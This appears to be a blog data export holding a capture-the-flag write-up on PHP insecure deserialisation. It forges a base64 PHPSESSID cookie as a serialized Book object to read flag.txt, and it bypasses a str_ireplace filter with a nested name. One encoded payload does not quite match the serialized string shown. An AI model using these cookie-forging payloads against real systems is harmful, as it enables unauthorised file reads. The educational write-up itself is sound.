thanks.</p>\n"},{"title":"libwary","date":"2024-02-29T13:45:18.000Z","_content":"\nLibwary Writeup\n                \n*Disclaimer: I neither did this completely on my own nor did this during the competition. Although I solved 90% on my own, I did get a pretty big hint*\n\n\nRECON\n========================================================\nThe Website\n-\n\nWe are presented with a dropdown menu with 5 books. One of them is called \"The flag\", which obviously immediately gives us the flag and this writeup doesn't actually exist.\n\nMoving on, we can select which book to read, and it its contents are shown on the page.\n\nThere aren't any other ways to give user inputs, and we can't modify any of the book options, so we look elsewhere. \n\nChecking our cookies, I noticed that we have a `PHPSESSID`, of course in base64.\nDecrypting this, we are provided with a serialised PHP object.\n\n`O:4:\"User\":1:{s:4:\"name\";s:12:\"User86968804\";}`\n\n\n*Here comes me being dumb. As this was my first ever CTF competition, I had very little experience and had no clue what PHP serialisation was. So, I gave up here during the competition, after which someone told me that the solution was PHP deserialisation, and a few Google searches later, I solved it (yay).*\n\nDeserialising the object, we get:\n\n\n`__PHP_Incomplete_Class Object`\n`(`\n`    [__PHP_Incomplete_Class_Name] => User`\n`    [name] => User86968804`\n`)`\n\nEssentially, the `PHPSESSID` is a serialised PHP object of class `User` and a value for name.\n\nVery interesting. We may be able to exploit this in the future as the code displays \"Welcome to the Libwary, {name}\"\n\n\nFiles and source\n-\n\nWe are given a file, Libwary.zip. In it we have 2 PHP files, index.php and util.php as well as a directory containing the books, fakeflag.txt and flag.txt, of course with a redacted flag.\n\nOpening util.php, we can see the following:\n\n\n\n![util](/images/pfp.jpg)\n\nWe notice that there are two classes,  `book`  and `user`. The User class does... well not really anything. However, the book class is interesting. We can see that it uses the `$name` variable to find the corresponding book and then returns the content of said book whenever an instance of the class is treated as a string.\n\nAlso note that if the name is not `fakeflag` but contains \"flag\", the word \"flag\" gets deleted.\n\n\n\n\nEXPLOIT\n=======\nNow for the fun part, exploitation.\n\nThe Big Idea\n--\nThe main vulnerability lies in these two lines:\n\n`$user = unserialize(base64_decode($_COOKIE['PHPSESSID']));`\nand, of course\n`echo $user;`\n\nIf we can get `echo $user` to echo the contents of a Book object, we could just use that to get the contents of flag.txt. \n\nVery conveniently, the `__tostring()` function does exactly what we need. If we just changed the PHPSESSID cookie to a serialised object of class `Book`, like, say, I don't know, a `Book` object of `$name` flag.txt, it would just echo out flag.txt.\n\nExecution\n--\n\nFirstly, we create a serialised object that looks like this:\n\n`O:4:\"Book\":1:{s:4:\"name\";s:8:\"flag.txt\";}`\n\nThis creates an instance of `Book` that has the name \"flag.txt\".\n\nNext, we encode it in Base64 to get this:\n\n`Tzo0OiJCb29rIjoxOntzOjQ6Im5hbWUiO3M6ODoiZmxhZy50eHQiO30`\n\nPassing this into our PHPSESSID and...\n\nimage to be adding\n\nWhoops. Forgot about the final defence code.\n\n`//final defence`\n \n` if ($this->name != \"fakeflag.txt\") $this->name = str_ireplace(\"flag\", \"\", $this->name);`\n\nHowever, this is an easy fix. We just change up our serialised object to this:\n `O:4:\"Book\":1:{s:4:\"name\";s:12:\"flaflagg.txt\";}` \n\nWhen the code tries to replace the \"flag\" in \"flaflagg\", it just gives us back \"flag.txt\"\n\nRe-serialising and re-encoding, we get:\n\n`Tzo0OiJCb29rIjoxOntzOjQ6Im5hbWUiO3M6MTI6ImZsZmxhZ2FnLnR4dCI7fQ`\n\nNow we pass this into our PHPSESSID and..\n\nimage\n\nBam. Flag.\n","source":"_posts/libwary.md","raw":"---\ntitle: libwary\ndate: 2024-02-29 21:45:18\ntags:\n---\n\nLibwary Writeup\n                \n*Disclaimer: I neither did this completely on my own nor did this during the competition. Although I solved 90% on my own, I did get a pretty big hint*\n\n\nRECON\n========================================================\nThe Website\n-\n\nWe are presented with a dropdown menu with 5 books. One of them is called \"The flag\", which obviously immediately gives us the flag and this writeup doesn't actually exist.\n\nMoving on, we can select which book to read, and it its contents are shown on the page.\n\nThere aren't any other ways to give user inputs, and we can't modify any of the book options, so we look elsewhere. \n\nChecking our cookies, I noticed that we have a `PHPSESSID`, of course in base64.\nDecrypting this, we are provided with a serialised PHP object.\n\n`O:4:\"User\":1:{s:4:\"name\";s:12:\"User86968804\";}`\n\n\n*Here comes me being dumb. As this was my first ever CTF competition, I had very little experience and had no clue what PHP serialisation was. So, I gave up here during the competition, after which someone told me that the solution was PHP deserialisation, and a few Google searches later, I solved it (yay).*\n\nDeserialising the object, we get:\n\n\n`__PHP_Incomplete_Class Object`\n`(`\n`    [__PHP_Incomplete_Class_Name] => User`\n`    [name] => User86968804`\n`)`\n\nEssentially, the `PHPSESSID` is a serialised PHP object of class `User` and a value for name.\n\nVery interesting. We may be able to exploit this in the future as the code displays \"Welcome to the Libwary, {name}\"\n\n\nFiles and source\n-\n\nWe are given a file, Libwary.zip. In it we have 2 PHP files, index.php and util.php as well as a directory containing the books, fakeflag.txt and flag.txt, of course with a redacted flag.\n\nOpening util.php, we can see the following:\n\n\n\n![util](/images/pfp.jpg)\n\nWe notice that there are two classes,  `book`  and `user`. The User class does... well not really anything. However, the book class is interesting. We can see that it uses the `$name` variable to find the corresponding book and then returns the content of said book whenever an instance of the class is treated as a string.\n\nAlso note that if the name is not `fakeflag` but contains \"flag\", the word \"flag\" gets deleted.\n\n\n\n\nEXPLOIT\n=======\nNow for the fun part, exploitation.\n\nThe Big Idea\n--\nThe main vulnerability lies in these two lines:\n\n`$user = unserialize(base64_decode($_COOKIE['PHPSESSID']));`\nand, of course\n`echo $user;`\n\nIf we can get `echo $user` to echo the contents of a Book object, we could just use that to get the contents of flag.txt. \n\nVery conveniently, the `__tostring()` function does exactly what we need. If we just changed the PHPSESSID cookie to a serialised object of class `Book`, like, say, I don't know, a `Book` object of `$name` flag.txt, it would just echo out flag.txt.\n\nExecution\n--\n\nFirstly, we create a serialised object that looks like this:\n\n`O:4:\"Book\":1:{s:4:\"name\";s:8:\"flag.txt\";}`\n\nThis creates an instance of `Book` that has the name \"flag.txt\".\n\nNext, we encode it in Base64 to get this:\n\n`Tzo0OiJCb29rIjoxOntzOjQ6Im5hbWUiO3M6ODoiZmxhZy50eHQiO30`\n\nPassing this into our PHPSESSID and...\n\nimage to be adding\n\nWhoops. Forgot about the final defence code.\n\n`//final defence`\n \n` if ($this->name != \"fakeflag.txt\") $this->name = str_ireplace(\"flag\", \"\", $this->name);`\n\nHowever, this is an easy fix. We just change up our serialised object to this:\n `O:4:\"Book\":1:{s:4:\"name\";s:12:\"flaflagg.txt\";}` \n\nWhen the code tries to replace the \"flag\" in \"flaflagg\", it just gives us back \"flag.txt\"\n\nRe-serialising and re-encoding, we get:\n\n`Tzo0OiJCb29rIjoxOntzOjQ6Im5hbWUiO3M6MTI6ImZsZmxhZ2FnLnR4dCI7fQ`\n\nNow we pass this into our PHPSESSID and..\n\nimage\n\nBam. Flag.\n","slug":"libwary","published":1,"updated":"2024-11-19T15:56:56.667Z","comments":1,"layout":"post","photos":[],"_id":"cm3onln1x00018ond7u8xbo4j","content":"<p>Libwary Writeup</p>\n<p><em>Disclaimer: I neither did this completely on my own nor did this during the competition. Although I solved 90% on my own, I did get a pretty big hint</em></p>\n<h1 id=\"RECON\"><a href=\"#RECON\" class=\"headerlink\" title=\"RECON\"></a>RECON</h1><h2 id=\"The-Website\"><a href=\"#The-Website\" class=\"headerlink\" title=\"The Website\"></a>The Website</h2><p>We are presented with a dropdown menu with 5 books. One of them is called “The flag”, which obviously immediately gives us the flag and this writeup doesn’t actually exist.</p>\n<p>Moving on, we can select which book to read, and it its contents are shown on the page.</p>\n<p>There aren’t any other ways to give user inputs, and we can’t modify any of the book options, so we look elsewhere. </p>\n<p>Checking our cookies, I noticed that we have a <code>PHPSESSID</code>, of course in base64.<br>Decrypting this, we are provided with a serialised PHP object.</p>\n<p><code>O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:12:&quot;User86968804&quot;;&#125;</code></p>\n<p><em>Here comes me being dumb. As this was my first ever CTF competition, I had very little experience and had no clue what PHP serialisation was. So, I gave up here during the competition, after which someone told me that the solution was PHP deserialisation, and a few Google searches later, I solved it (yay).</em></p>\n<p>Deserialising the object, we get:</p>\n<p><code>__PHP_Incomplete_Class Object</code><br><code>(</code><br><code>    [__PHP_Incomplete_Class_Name] =&gt; User</code><br><code>    [name] =&gt; User86968804</code><br><code>)</code></p>\n<p>Essentially, the <code>PHPSESSID</code> is a serialised PHP object of class <code>User</code> and a value for name.</p>\n<p>Very interesting. We may be able to exploit this in the future as the code displays “Welcome to the Libwary, {name}”</p>\n<h2 id=\"Files-and-source\"><a href=\"#Files-and-source\" class=\"headerlink\" title=\"Files and source\"></a>Files and source</h2><p>We are given a file, Libwary.zip. In it we have 2 PHP files, index.php and util.php as well as a directory containing the books, fakeflag.txt and flag.txt, of course with a redacted flag.</p>\n<p>Opening util.php, we can see the following:</p>\n<p><img src=\"/images/pfp.jpg\" alt=\"util\"></p>\n<p>We notice that there are two classes,  <code>book</code>  and <code>user</code>. The User class does… well not really anything. However, the book class is interesting. We can see that it uses the <code>$name</code> variable to find the corresponding book and then returns the content of said book whenever an instance of the class is treated as a string.</p>\n<p>Also note that if the name is not <code>fakeflag</code> but contains “flag”, the word “flag” gets deleted.</p>\n<h1 id=\"EXPLOIT\"><a href=\"#EXPLOIT\" class=\"headerlink\" title=\"EXPLOIT\"></a>EXPLOIT</h1><p>Now for the fun part, exploitation.</p>\n<h2 id=\"The-Big-Idea\"><a href=\"#The-Big-Idea\" class=\"headerlink\" title=\"The Big Idea\"></a>The Big Idea</h2><p>The main vulnerability lies in these two lines:</p>\n<p><code>$user = unserialize(base64_decode($_COOKIE[&#39;PHPSESSID&#39;]));</code><br>and, of course<br><code>echo $user;</code></p>\n<p>If we can get <code>echo $user</code> to echo the contents of a Book object, we could just use that to get the contents of flag.txt. </p>\n<p>Very conveniently, the <code>__tostring()</code> function does exactly what we need. If we just changed the PHPSESSID cookie to a serialised object of class <code>Book</code>, like, say, I don’t know, a <code>Book</code> object of <code>$name</code> flag.txt, it would just echo out flag.txt.</p>\n<h2 id=\"Execution\"><a href=\"#Execution\" class=\"headerlink\" title=\"Execution\"></a>Execution</h2><p>Firstly, we create a serialised object that looks like this:</p>\n<p><code>O:4:&quot;Book&quot;:1:&#123;s:4:&quot;name&quot;;s:8:&quot;flag.txt&quot;;&#125;</code></p>\n<p>This creates an instance of <code>Book</code> that has the name “flag.txt”.</p>\n<p>Next, we encode it in Base64 to get this:</p>\n<p><code>Tzo0OiJCb29rIjoxOntzOjQ6Im5hbWUiO3M6ODoiZmxhZy50eHQiO30</code></p>\n<p>Passing this into our PHPSESSID and…</p>\n<p>image to be adding</p>\n<p>Whoops. Forgot about the final defence code.</p>\n<p><code>//final defence</code></p>\n<p><code> if ($this-&gt;name != &quot;fakeflag.txt&quot;) $this-&gt;name = str_ireplace(&quot;flag&quot;, &quot;&quot;, $this-&gt;name);</code></p>\n<p>However, this is an easy fix. We just change up our serialised object to this:<br> <code>O:4:&quot;Book&quot;:1:&#123;s:4:&quot;name&quot;;s:12:&quot;flaflagg.txt&quot;;&#125;</code> </p>\n<p>When the code tries to replace the “flag” in “flaflagg”, it just gives us back “flag.txt”</p>\n<p>Re-serialising and re-encoding, we get:</p>\n<p><code>Tzo0OiJCb29rIjoxOntzOjQ6Im5hbWUiO3M6MTI6ImZsZmxhZ2FnLnR4dCI7fQ</code></p>\n<p>Now we pass this into our PHPSESSID and..</p>\n<p>image</p>\n<p>Bam. Flag.</p>\n","excerpt":"","more":"<p>Libwary Writeup</p>\n<p><em>Disclaimer: I neither did this completely on my own nor did this during the competition. Although I solved 90% on my own, I did get a pretty big hint</em></p>\n<h1 id=\"RECON\"><a href=\"#RECON\" class=\"headerlink\" title=\"RECON\"></a>RECON</h1><h2 id=\"The-Website\"><a href=\"#The-Website\" class=\"headerlink\" title=\"The Website\"></a>The Website</h2><p>We are presented with a dropdown menu with 5 books. One of them is called “The flag”, which obviously immediately gives us the flag and this writeup doesn’t actually exist.</p>\n<p>Moving on, we can select which book to read, and it its contents are shown on the page.</p>\n<p>There aren’t any other ways to give user inputs, and we can’t modify any of the book options, so we look elsewhere. </p>\n<p>Checking our cookies, I noticed that we have a <code>PHPSESSID</code>, of course in base64.<br>Decrypting this, we are provided with a serialised PHP object.</p>\n<p><code>O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:12:&quot;User86968804&quot;;&#125;</code></p>\n<p><em>Here comes me being dumb. As this was my first ever CTF competition, I had very little experience and had no clue what PHP serialisation was. So, I gave up here during the competition, after which someone told me that the solution was PHP deserialisation, and a few Google searches later, I solved it (yay).</em></p>\n<p>Deserialising the object, we get:</p>\n<p><code>__PHP_Incomplete_Class Object</code><br><code>(</code><br><code>    [__PHP_Incomplete_Class_Name] =&gt; User</code><br><code>    [name] =&gt; User86968804</code><br><code>)</code></p>\n<p>Essentially, the <code>PHPSESSID</code> is a serialised PHP object of class <code>User</code> and a value for name.</p>\n<p>Very interesting. We may be able to exploit this in the future as the code displays “Welcome to the Libwary, {name}”</p>\n<h2 id=\"Files-and-source\"><a href=\"#Files-and-source\" class=\"headerlink\" title=\"Files and source\"></a>Files and source</h2><p>We are given a file, Libwary.zip. In it we have 2 PHP files, index.php and util.php as well as a directory containing the books, fakeflag.txt and flag.txt, of course with a redacted flag.</p>\n<p>Opening util.php, we can see the following:</p>\n<p><img src=\"/images/pfp.jpg\" alt=\"util\"></p>\n<p>We notice that there are two classes,  <code>book</code>  and <code>user</code>. The User class does… well not really anything. However, the book class is interesting. We can see that it uses the <code>$name</code> variable to find the corresponding book and then returns the content of said book whenever an instance of the class is treated as a string.</p>\n<p>Also note that if the name is not <code>fakeflag</code> but contains “flag”, the word “flag” gets deleted.</p>\n<h1 id=\"EXPLOIT\"><a href=\"#EXPLOIT\" class=\"headerlink\" title=\"EXPLOIT\"></a>EXPLOIT</h1><p>Now for the fun part, exploitation.</p>\n<h2 id=\"The-Big-Idea\"><a href=\"#The-Big-Idea\" class=\"headerlink\" title=\"The Big Idea\"></a>The Big Idea</h2><p>The main vulnerability lies in these two lines:</p>\n<p><code>$user = unserialize(base64_decode($_COOKIE[&#39;PHPSESSID&#39;]));</code><br>and, of course<br><code>echo $user;</code></p>\n<p>If we can get <code>echo $user</code> to echo the contents of a Book object, we could just use that to get the contents of flag.txt. </p>\n<p>Very conveniently, the <code>__tostring()</code> function does exactly what we need. If we just changed the PHPSESSID cookie to a serialised object of class <code>Book</code>, like, say, I don’t know, a <code>Book</code> object of <code>$name</code> flag.txt, it would just echo out flag.txt.</p>\n<h2 id=\"Execution\"><a href=\"#Execution\" class=\"headerlink\" title=\"Execution\"></a>Execution</h2><p>Firstly, we create a serialised object that looks like this:</p>\n<p><code>O:4:&quot;Book&quot;:1:&#123;s:4:&quot;name&quot;;s:8:&quot;flag.txt&quot;;&#125;</code></p>\n<p>This creates an instance of <code>Book</code> that has the name “flag.txt”.</p>\n<p>Next, we encode it in Base64 to get this:</p>\n<p><code>Tzo0OiJCb29rIjoxOntzOjQ6Im5hbWUiO3M6ODoiZmxhZy50eHQiO30</code></p>\n<p>Passing this into our PHPSESSID and…</p>\n<p>image to be adding</p>\n<p>Whoops. Forgot about the final defence code.</p>\n<p><code>//final defence</code></p>\n<p><code> if ($this-&gt;name != &quot;fakeflag.txt&quot;) $this-&gt;name = str_ireplace(&quot;flag&quot;, &quot;&quot;, $this-&gt;name);</code></p>\n<p>However, this is an easy fix. We just change up our serialised object to this:<br> <code>O:4:&quot;Book&quot;:1:&#123;s:4:&quot;name&quot;;s:12:&quot;flaflagg.txt&quot;;&#125;</code> </p>\n<p>When the code tries to replace the “flag” in “flaflagg”, it just gives us back “flag.txt”</p>\n<p>Re-serialising and re-encoding, we get:</p>\n<p><code>Tzo0OiJCb29rIjoxOntzOjQ6Im5hbWUiO3M6MTI6ImZsZmxhZ2FnLnR4dCI7fQ</code></p>\n<p>Now we pass this into our PHPSESSID and..</p>\n<p>image</p>\n<p>Bam. Flag.</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}